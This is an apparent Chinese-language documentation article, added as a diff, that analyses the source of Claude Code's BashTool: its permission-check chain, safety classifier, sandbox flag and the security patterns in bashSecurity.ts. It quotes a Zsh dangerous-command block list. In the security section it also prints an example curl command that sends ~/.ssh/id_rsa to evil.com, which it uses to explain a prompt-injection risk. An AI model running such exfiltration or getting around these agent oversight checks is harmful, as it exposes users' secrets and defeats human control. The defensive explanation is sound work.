@@ -1,0 +1,369 @@
+---
+sidebar_position: 3
+title: "实战解读：BashTool 完整源码分析"
+description: 深度解析 BashTool 如何执行 shell 命令、处理权限检查、管理超时与工作目录，以及危险命令的安全防护机制
+---
+
+import DifficultyBadge from '@site/src/components/DifficultyBadge';
+import SourceRef from '@site/src/components/SourceRef';
+import ArticleComplete from '@site/src/components/ArticleComplete';
+
+# 实战解读：BashTool 完整源码分析
+
+<DifficultyBadge level="深度" />
+
+`BashTool` 是 Claude Code 最核心、也最复杂的工具。它让 Claude 拥有了在用户机器上执行任意 shell 命令的能力——这既是 Claude Code 强大的根源，也是安全挑战最集中的地方。
+
+`BashTool` 的源码分散在 `source/src/tools/BashTool/` 目录下的 17 个文件中，主文件 `BashTool.tsx` 超过 800 行。让我们系统地拆解它。
+
+## 输入 Schema：比你想象的更复杂
+
+```typescript
+// source/src/tools/BashTool/BashTool.tsx，第 227 行
+const fullInputSchema = lazySchema(() =>
+  z.strictObject({
+    // 要执行的 shell 命令
+    command: z.string().describe('The command to execute'),
+
+    // 可选超时（毫秒），有上限
+    timeout: semanticNumber(z.number().optional()).describe(
+      `Optional timeout in milliseconds (max ${getMaxTimeoutMs()})`,
+    ),
+
+    // 命令描述（用于 UI 展示，不执行）
+    description: z.string().optional().describe(`...`),
+
+    // 是否后台运行
+    run_in_background: semanticBoolean(z.boolean().optional()).describe(
+      `Set to true to run this command in the background...`,
+    ),
+
+    // 危险：禁用沙箱模式
+    dangerouslyDisableSandbox: semanticBoolean(z.boolean().optional()),
+
+    // 内部字段：sed 编辑的预计算结果（不暴露给 Claude）
+    _simulatedSedEdit: z.object({
+      filePath: z.string(),
+      newContent: z.string(),
+    }).optional(),
+  }),
+)
+```
+
+注意 `_simulatedSedEdit` 字段：这是权限系统的一个巧妙设计。当 Claude 执行 `sed -i 's/old/new/' file` 这样的命令时，权限弹窗会预先计算出修改结果让用户预览；用户批准后，实际执行的不是 `sed` 命令（可能有细微差异），而是直接把预计算的新内容写入文件。这保证了"你看到的就是你批准的"。
+
+`_simulatedSedEdit` 被刻意**从模型可见的 schema 中去除**：
+
+```typescript
+// source/src/tools/BashTool/BashTool.tsx，第 254 行
+// 向模型暴露的 schema 永远不包含 _simulatedSedEdit
+const inputSchema = lazySchema(() =>
+  isBackgroundTasksDisabled
+    ? fullInputSchema().omit({ run_in_background: true, _simulatedSedEdit: true })
+    : fullInputSchema().omit({ _simulatedSedEdit: true })
+)
+```
+
+原因注释里说得很清楚：暴露这个字段会让 Claude 能够绕过权限检查，直接用"无害命令 + 任意文件写入"的组合来修改文件。
+
+## 并发安全：只读命令才能并行
+
+```typescript
+// source/src/tools/BashTool/BashTool.tsx，第 434 行
+isConcurrencySafe(input) {
+  // BashTool 的并发安全性等价于它是否只读
+  return this.isReadOnly?.(input) ?? false
+},
+
+isReadOnly(input) {
+  // 检查命令是否包含 cd（会改变 cwd，影响后续命令）
+  const compoundCommandHasCd = commandHasAnyCd(input.command)
+  const result = checkReadOnlyConstraints(input, compoundCommandHasCd)
+  return result.behavior === 'allow'
+},
+```
+
+`checkReadOnlyConstraints()` 的判断逻辑包括：
+- 命令是否在只读命令白名单中（`cat`、`ls`、`grep`、`git log` 等）
+- 命令是否包含写入操作符（`>`、`>>`、`|`接写入命令）
+- 命令是否包含 `cd`（改变 cwd 是有状态操作，影响其他并行命令）
+
+## validateInput()：睡眠命令检测
+
+```typescript
+// source/src/tools/BashTool/BashTool.tsx，第 524 行
+async validateInput(input: BashToolInput): Promise<ValidationResult> {
+  // 如果 MonitorTool 可用，阻止不必要的 sleep
+  if (feature('MONITOR_TOOL') && !isBackgroundTasksDisabled && !input.run_in_background) {
+    const sleepPattern = detectBlockedSleepPattern(input.command)
+    if (sleepPattern !== null) {
+      return {
+        result: false,
+        message: `Blocked: ${sleepPattern}. Run blocking commands in the background...`,
+        errorCode: 10,
+      }
+    }
+  }
+  return { result: true }
+},
+```
+
+`detectBlockedSleepPattern()` 专门检测 `sleep N && check` 这类模式（等待 N 秒然后做检查）。这类命令在 AI 交互中极其低效——AI 在等待期间什么也做不了。正确的做法是用 `run_in_background: true` 把长命令放到后台，或者用 MonitorTool 注册一个完成回调。
+
+## checkPermissions()：复杂的权限检查链
+
+权限检查委托给 `bashToolHasPermission()`，这是整个 BashTool 最复杂的函数，包含多个检查阶段：
+
+**阶段一：安全预检**
+
+```typescript
+// bashPermissions.ts 简化版
+
+// 1. 检查是否有危险的 bash 语法模式（命令替换、进程替换等）
+const securityCheck = await bashCommandIsSafeAsync(input.command)
+if (!securityCheck.safe) {
+  return { behavior: 'deny', message: securityCheck.reason }
+}
+
+// 2. 检查 sed 命令格式（特殊处理以生成预览）
+const sedCheck = checkSedConstraints(input)
+if (sedCheck) return sedCheck
+
+// 3. 检查路径约束（防止越权访问）
+const pathCheck = checkPathConstraints(input, cwd)
+if (pathCheck) return pathCheck
+```
+
+**阶段二：权限规则匹配**
+
+```typescript
+// 检查 alwaysAllow 规则（用户配置的"总是允许"）
+for (const rule of allowRules) {
+  if (matchesRule(input.command, rule)) {
+    return { behavior: 'allow' }
+  }
+}
+
+// 检查 alwaysDeny 规则（用户配置的"总是拒绝"）
+for (const rule of denyRules) {
+  if (matchesRule(input.command, rule)) {
+    return {
+      behavior: 'deny',
+      message: `Command matches deny rule: ${rule}`,
+    }
+  }
+}
+```
+
+**阶段三：AI 安全分类器（可选）**
+
+当 `BASH_CLASSIFIER` feature 启用时，会调用一个轻量 LLM 对命令进行安全分类：
+
+```typescript
+// 发送给分类器的格式
+const classifierResult = await classifyBashCommand(input.command)
+if (classifierResult.behavior === 'deny') {
+  return { behavior: 'deny', message: classifierResult.reason }
+}
+```
+
+## 危险命令安全检测：bashSecurity.ts
+
+`bashSecurity.ts` 是安全防护的核心，它维护了一张详细的"危险模式"列表：
+
+```typescript
+// source/src/tools/BashTool/bashSecurity.ts，第 16 行
+
+// 命令替换和进程替换模式
+const COMMAND_SUBSTITUTION_PATTERNS = [
+  { pattern: /<\(/, message: 'process substitution <()' },
+  { pattern: />\(/, message: 'process substitution >()' },
+  { pattern: /\$\(/, message: '$() command substitution' },
+  { pattern: /\$\{/, message: '${} parameter substitution' },
+  // Zsh 特有的危险模式
+  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion' },
+  // ...共 15+ 种模式
+]
+
+// Zsh 危险命令（可以绕过安全检查）
+const ZSH_DANGEROUS_COMMANDS = new Set([
+  'zmodload',   // 加载危险模块的入口
+  'zpty',       // 伪终端执行（可绕过限制）
+  'ztcp',       // TCP 连接（可用于数据泄露）
+  'sysopen',    // 底层文件操作
+  // ...共 15+ 个
+])
+```
+
+为什么要阻止命令替换？因为它让 Claude 可以构造这样的命令：
+
+```bash
+# 看起来只是 echo，实际上执行了 curl 数据外传
+echo $(curl -s https://evil.com/steal?data=$(cat ~/.ssh/id_rsa))
+```
+
+通过阻止 `$()` 语法，Claude 只能使用"看起来是什么就是什么"的简单命令，大大降低了被恶意 prompt injection 利用的风险。
+
+## call()：执行核心
+
+```typescript
+// source/src/tools/BashTool/BashTool.tsx，第 624 行
+async call(input, toolUseContext, _canUseTool, parentMessage, onProgress) {
+  // 特殊情况：sed 编辑直接应用预计算结果，不运行实际命令
+  if (input._simulatedSedEdit) {
+    return applySedEdit(input._simulatedSedEdit, toolUseContext, parentMessage)
+  }
+
+  const { abortController, getAppState, setAppState, setToolJSX } = toolUseContext
+
+  // 通过异步生成器运行命令，实时推送进度
+  const commandGenerator = runShellCommand({
+    input,
+    abortController,
+    // 使用 setAppStateForTasks 注册后台任务（即使是子 agent 也能被管理）
+    setAppState: toolUseContext.setAppStateForTasks ?? setAppState,
+    setToolJSX,
+    preventCwdChanges: !isMainThread,  // 子 agent 不允许改变 cwd
+    isMainThread: !toolUseContext.agentId,
+    toolUseId: toolUseContext.toolUseId,
+    agentId: toolUseContext.agentId,
+  })
+
+  // 消费生成器，将进度事件转发给 onProgress
+  let generatorResult
+  do {
+    generatorResult = await commandGenerator.next()
+    if (!generatorResult.done && onProgress) {
+      onProgress({
+        toolUseID: `bash-progress-${progressCounter++}`,
+        data: {
+          type: 'bash_progress',
+          output: generatorResult.value.output,
+          elapsedTimeSeconds: generatorResult.value.elapsedTimeSeconds,
+          // ...
+        },
+      })
+    }
+  } while (!generatorResult.done)
+
+  const result = generatorResult.value
+```
+
+注意 `preventCwdChanges: !isMainThread`：子 agent（通过 AgentTool 创建的）不允许通过 `cd` 改变工作目录，因为 cwd 是全局共享状态，子 agent 改变它会影响主线程。只有主线程的 BashTool 才允许 `cd`。
+
+## 输出截断：大输出的处理
+
+当命令输出超过 30KB 时（`maxResultSizeChars: 30_000`），系统会将输出持久化到磁盘：
+
+```typescript
+// source/src/tools/BashTool/BashTool.tsx，第 732 行
+const MAX_PERSISTED_SIZE = 64 * 1024 * 1024 // 64MB 上限
+
+if (result.outputFilePath && result.outputTaskId) {
+  const fileStat = await fsStat(result.outputFilePath)
+  persistedOutputSize = fileStat.size
+
+  // 超过 64MB 则截断
+  if (fileStat.size > MAX_PERSISTED_SIZE) {
+    await fsTruncate(result.outputFilePath, MAX_PERSISTED_SIZE)
+  }
+
+  // 硬链接优先（快），失败则复制
+  try {
+    await link(result.outputFilePath, dest)
+  } catch {
+    await copyFile(result.outputFilePath, dest)
+  }
+  persistedOutputPath = dest
+}
+```
+
+在 `mapToolResultToToolResultBlockParam()` 中，大输出会被替换为带预览的占位消息：
+
+```typescript
+// 给 Claude 的消息格式（不是完整输出）
+if (persistedOutputPath) {
+  const preview = generatePreview(processedStdout, PREVIEW_SIZE_BYTES)
+  processedStdout = buildLargeToolResultMessage({
+    filepath: persistedOutputPath,
+    originalSize: persistedOutputSize ?? 0,
+    preview: preview.preview,
+    hasMore: preview.hasMore,
+  })
+}
+```
+
+Claude 收到的是类似 `<persisted-output path="/tmp/.../tool-results/xxx">...前256字节预览...</persisted-output>` 的消息。如果它需要完整内容，可以用 `FileRead` 工具读取那个路径。
+
+## 图片输出的特殊处理
+
+有些命令（如截图工具）会输出 Base64 编码的图片。BashTool 会检测这种情况并转换为图片内容块：
+
+```typescript
+// source/src/tools/BashTool/BashTool.tsx，第 785 行
+let isImage = isImageOutput(strippedStdout)
+
+if (isImage) {
+  // 检查是否需要压缩（防止超大图片填满上下文）
+  const resized = await resizeShellImageOutput(
+    strippedStdout,
+    result.outputFilePath,
+    persistedOutputSize,
+  )
+  if (resized) {
+    compressedStdout = resized
+  } else {
+    isImage = false  // 压缩失败，退回文本模式
+  }
+}
+```
+
+在 `mapToolResultToToolResultBlockParam()` 中，图片被格式化为 Claude Vision API 可以识别的格式：
+
+```typescript
+if (isImage) {
+  return {
+    tool_use_id: toolUseID,
+    type: 'tool_result',
+    content: [{
+      type: 'image',
+      source: { type: 'base64', media_type: 'image/png', data: stdout },
+    }],
+  }
+}
+```
+
+## 工作目录管理
+
+BashTool 的一个重要但隐式的功能是工作目录（cwd）管理。每个 bash 命令在独立进程中运行，`cd` 命令不会影响后续命令。但 Claude Code 维护一个"会话级 cwd"，通过 `setCwd()` 更新：
+
+```typescript
+// bash 命令运行完成后检查 cwd
+if (!preventCwdChanges) {
+  const appState = getAppState()
+  // 如果 cwd 跑到了项目目录之外，自动重置
+  if (resetCwdIfOutsideProject(appState.toolPermissionContext)) {
+    stderrForShellReset = stdErrAppendShellResetMessage('')
+  }
+}
+```
+
+这个设计防止了 Claude 通过连续 `cd ../../../` 命令悄悄跑到系统目录执行危险操作。
+
+## 总结：BashTool 的设计权衡
+
+BashTool 是安全性与灵活性之间权衡的缩影：
+
+| 限制 | 原因 |
+|------|------|
+| 阻止命令替换 `$()` | 防止隐藏的危险命令执行 |
+| 子 agent 禁止 `cd` | 防止影响主线程 cwd |
+| 大输出持久化 | 保护上下文窗口，避免 token 爆炸 |
+| sed 命令预览 | 保证用户批准的就是实际执行的 |
+| sleep 检测 | 引导 AI 使用更好的异步模式 |
+
+这些限制不是随意添加的，每一个都源于真实遇到的问题或安全威胁。`BashTool` 的复杂性，就是 AI 与真实系统交互时不可避免的安全代价。
+
+<SourceRef file="source/src/tools/BashTool/BashTool.tsx" lines="1-850" />
+
+<ArticleComplete />
